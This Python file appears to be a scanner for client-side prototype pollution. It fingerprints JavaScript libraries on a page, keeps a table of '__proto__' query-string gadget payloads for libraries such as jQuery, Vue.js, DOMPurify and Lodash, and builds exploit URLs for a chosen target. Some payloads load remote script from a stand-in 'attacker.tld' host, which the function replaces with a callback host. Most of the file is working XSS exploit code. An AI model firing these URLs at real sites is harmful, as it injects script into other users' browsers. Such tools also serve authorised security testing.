from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

FINGERPRINT_JS = """
(() => {
  let gadgets = [];

  if (typeof _satellite !== 'undefined') {
    gadgets.push('Adobe Dynamic Tag Management');
  }

  if (typeof BOOMR !== 'undefined') {
    gadgets.push('Akamai Boomerang');
  }

  if (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined') {
    gadgets.push('Closure');
  }

  if (typeof DOMPurify !== 'undefined') {
    gadgets.push('DOMPurify');
  }

  if (typeof window.embedly !== 'undefined') {
    gadgets.push('Embedly Cards');
  }

  if (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined') {
    gadgets.push('jQuery');
  }

  if (typeof filterXSS !== 'undefined') {
    gadgets.push('js-xss');
  }

  if (typeof ko !== 'undefined' && typeof ko.version !== 'undefined') {
    gadgets.push('Knockout.js');
  }

  if (typeof _ !== 'undefined' && typeof _.template !== 'undefined' && typeof _.VERSION !== 'undefined') {
    gadgets.push('Lodash <= 4.17.15');
  }

  if (typeof Marionette !== 'undefined') {
    gadgets.push('Marionette.js / Backbone.js');
  }

  if (typeof recaptcha !== 'undefined') {
    gadgets.push('Google reCAPTCHA');
  }

  if (typeof sanitizeHtml !== 'undefined') {
    gadgets.push('sanitize-html');
  }

  if (typeof analytics !== 'undefined' && typeof analytics.SNIPPET_VERSION !== 'undefined') {
    gadgets.push('Segment Analytics.js');
  }

  if (typeof Sprint !== 'undefined') {
    gadgets.push('Sprint.js');
  }

  if (typeof SwiftypeObject != 'undefined') {
    gadgets.push('Swiftype Site Search (uses jQuery BBQ)');
  }

  if (typeof utag !== 'undefined' && typeof utag.id !== 'undefined') {
    gadgets.push('Tealium Universal Tag');
  }

  if (typeof twq !== 'undefined' && typeof twq.version !== 'undefined') {
    gadgets.push('Twitter Universal Website Tag');
  }

  if (typeof wistiaEmbeds !== 'undefined') {
    gadgets.push('Wistia Embedded Video');
  }

  if (typeof $ !== 'undefined' && typeof $.zepto !== 'undefined') {
    gadgets.push('Zepto.js');
  }

  if (typeof Vue != 'undefined') {
    gadgets.push('Vue.js');
  }

  if (typeof Demandbase != 'undefined') {
    gadgets.push('Demandbase Tag');
  }

  if (typeof _analytics !== 'undefined' && typeof analyticsGtagManager !== 'undefined') {
    gadgets.push('Google Tag Manager/Analytics');
  }

  if (typeof i18next !== 'undefined') {
    gadgets.push('i18next');
  }

  if (typeof GoogleAnalyticsObject !== 'undefined') {
    gadgets.push('Google Analytics');
  }

  if (typeof Popper !== 'undefined') {
    gadgets.push('Popper.js');
  }

  if (typeof pendo !== 'undefined') {
    gadgets.push('Pendo Agent');
  }

  return gadgets;
})();
"""

GADGET_PAYLOADS = {
    "Adobe Dynamic Tag Management": [
        [("__proto__[src]", "data:,alert(1)//")]
    ],
    "Akamai Boomerang": [
        [("__proto__[BOOMR]", "1"), ("__proto__[url]", "//attacker.tld/js.js")]
    ],
    "Closure": [
        [("__proto__[* ONERROR]", "1"), ("__proto__[* SRC]", "1")],
        [("__proto__[CLOSURE_BASE_PATH]", "data:,alert(1)//")]
    ],
    "DOMPurify": [
        [("__proto__[ALLOWED_ATTR][0]", "onerror"), ("__proto__[ALLOWED_ATTR][1]", "src")],
        [("__proto__[documentMode]", "9")]
    ],
    "Embedly Cards": [
        [("__proto__[onload]", "alert(1)")]
    ],
    "jQuery": [
        [("__proto__[context]", "<img/src/onerror=alert(1)>"), ("__proto__[jquery]", "x")],
        [("__proto__[url][]", "data:,alert(1)//"), ("__proto__[dataType]", "script")],
        [("__proto__[url]", "data:,alert(1)//"), ("__proto__[dataType]", "script"), ("__proto__[crossDomain]", "")],
        [("__proto__[src][]", "data:,alert(1)//")],
        [("__proto__[url]", "data:,alert(1)//")],
        [("__proto__[div][0]", "1"), ("__proto__[div][1]", "<img/src/onerror=alert(1)>"), ("__proto__[div][2]", "1")],
        [("__proto__[preventDefault]", "x"), ("__proto__[handleObj][]", "x"), ("__proto__[delegateTarget]", "<img/src/onerror=alert(1)>")]
    ],
    "js-xss": [
        [("__proto__[whiteList][img][0]", "onerror"), ("__proto__[whiteList][img][1]", "src")]
    ],
    "Knockout.js": [
        [("__proto__[4]", "a':1,[alert(1)]:1,'b"), ("__proto__[5]", ",")]
    ],
    "Lodash <= 4.17.15": [
        [("__proto__[sourceURL]", "\u2028\u2029alert(1)")]
    ],
    "Marionette.js / Backbone.js": [
        [("__proto__[tagName]", "img"), ("__proto__[src][]", "x:"), ("__proto__[onerror][]", "alert(1)")]
    ],
    "Google reCAPTCHA": [
        [("__proto__[srcdoc][]", "<script>alert(1)</script>")]
    ],
    "sanitize-html": [
        [("__proto__[*][]", "onload")],
        [("__proto__[innerText]", "<script>alert(1)</script>")]
    ],
    "Segment Analytics.js": [
        [("__proto__[script][0]", "1"), ("__proto__[script][1]", "<img/src/onerror=alert(1)>"), ("__proto__[script][2]", "1")]
    ],
    "Sprint.js": [
        [("__proto__[div][intro]", "<img src onerror=alert(1)>")]
    ],
    "Swiftype Site Search (uses jQuery BBQ)": [
         [("__proto__[xxx]", "alert(1)")]
    ],
     "Tealium Universal Tag": [
        [("__proto__[attrs][src]", "1"), ("__proto__[src]", "//attacker.tld/js.js")]
    ],
    "Twitter Universal Website Tag": [
        [("__proto__[attrs][src]", "1"), ("__proto__[hif][]", "javascript:alert(1)")]
    ],
    "Wistia Embedded Video": [
        [("__proto__[innerHTML]", "<img/src/onerror=alert(1)>")]
    ],
    "Zepto.js": [
        [("__proto__[onerror]", "alert(1)")]
    ],
    "Vue.js": [
        [("__proto__[v-if]", "_c.constructor('alert(1)')()")],
        [("__proto__[attrs][0][name]", "src"), ("__proto__[attrs][0][value]", "xxx"), ("__proto__[xxx]", "data:,alert(1)//"), ("__proto__[is]", "script")],
        [("__proto__[v-bind:class]", "''.constructor.constructor('alert(1)')()")],
        [("__proto__[data]", "a"), ("__proto__[template][nodeType]", "a"), ("__proto__[template][innerHTML]", "<script>alert(1)</script>")],
        [("__proto__[props][][value]", "a"), ("__proto__[name]", "\":''.constructor.constructor('alert(1)')(),\"")],
        [("__proto__[template]", "<script>alert(1)</script>")]
    ],
    "Demandbase Tag": [
        [("__proto__[Config][SiteOptimization][enabled]", "1"), ("//attacker.tld/json_cors.php?", "1")]
    ],
    "Google Tag Manager/Analytics": [
         [("__proto__[customScriptSrc]", "//attacker.tld/xss.js")]
    ],
    "i18next": [
         [("__proto__[lng]", "cimode"), ("__proto__[appendNamespaceToCIMode]", "x"), ("__proto__[nsSeparator]", "<img/src/onerror=alert(1)>")],
         [("__proto__[lng]", "a"), ("__proto__[a]", "b"), ("__proto__[obj]", "c"), ("__proto__[k]", "d"), ("__proto__[d]", "<img/src/onerror=alert(1)>")],
         [("__proto__[lng]", "a"), ("__proto__[key]", "<img/src/onerror=alert(1)>")]
    ],
    "Google Analytics": [
        [("__proto__[cookieName]", "COOKIE=Injection;")]
    ],
    "Popper.js": [
        [("__proto__[arrow][style]", "color:red;transition:all 1s"), ("__proto__[arrow][ontransitionend]", "alert(1)")],
        [("__proto__[reference][style]", "color:red;transition:all 1s"), ("__proto__[reference][ontransitionend]", "alert(2)")]
    ],
    "Pendo Agent": [
        [("__proto__[dataHost]", "attacker.tld/js.js#")]
     ]
}

def get_potential_urls(target_url: str, gadgets: list[str], callback_url: str = "attacker.tld") -> list[tuple[str, str]]:
    results = []
    
    for gadget in gadgets:
        if gadget in GADGET_PAYLOADS:
            payload_sets = GADGET_PAYLOADS[gadget]
            for params in payload_sets:
                parsed = urlparse(target_url)
                query = parse_qs(parsed.query, keep_blank_values=True)
                
                for k, v in params:
                     v_processed = v.replace("attacker.tld", callback_url)
                     
                     if k in query:
                         query[k].append(v_processed)
                     else:
                         query[k] = [v_processed]
                
                new_query = urlencode(query, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))
                results.append((new_url, gadget))
                
    return results
